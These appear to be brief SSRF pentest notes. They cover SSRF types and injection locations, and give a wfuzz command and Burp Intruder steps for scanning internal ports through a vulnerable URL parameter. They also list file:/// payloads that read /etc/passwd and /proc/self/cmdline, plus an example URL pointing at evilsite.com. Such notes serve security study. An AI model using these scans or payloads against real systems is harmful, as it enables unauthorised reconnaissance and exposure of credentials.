# Types:

### 1: Regular

### 2: Blind

# Locations:

### 1: When a full URL is used in a parameter in the address bar (https://site.com/form?server=http://evilsite.com/malware)

### 2: A hidden field in a form (View page source)

### 3: A partial URL such as just the hostname

### 4: Only the path of the URL

# IMPACT

### 1: Access to unauthorized areas

### 2: Access to customer/organizational data

### 3: Ability to scale to internal networks

### 4: Reveal authentication tokens/credentials

# Check for internal services on a machine via SSRF

## WFUZZ

#### wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ

## Burpsuite

#### 1) Run burpsuite

#### 2) Insert http://127.0.0.1/ (localhost value) on a field that accepts this kind of input

#### 3) Send to burpsuite intruder

#### 4) Attack type: Sniper. Then fuzz the "http://127.0.0.1:$port$" for finding other internal services running on the machine

#### 5) Set number fuzzing to 65535 (Runs through all port numbers)

#### 6) Start the attack

### TIP: If you find yourself some files with SSRF, don't forget to check their contents by viewing the page source!

## Important Files to check out with SSRF:

 - file:///etc/passwd

 - file:///proc/self/cmdline
